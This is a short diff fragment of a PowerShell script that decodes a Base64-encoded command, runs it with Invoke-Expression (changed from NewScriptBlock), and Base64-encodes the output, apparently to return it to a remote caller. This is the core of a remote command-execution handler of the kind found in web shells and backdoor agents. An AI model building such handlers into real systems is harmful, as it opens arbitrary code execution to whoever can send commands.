@@ -24,8 +24,7 @@ try
 		} else {
 			$command =  [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String( $command ))
 			try {
-				$script = $ExecutionContext.InvokeCommand.NewScriptBlock($command)
-				$html = & $script
+				$html = iex($command) | Out-String
 				$Bytes = [System.Text.Encoding]::Unicode.GetBytes($html)
 				$html =[Convert]::ToBase64String($Bytes)
 			} catch {
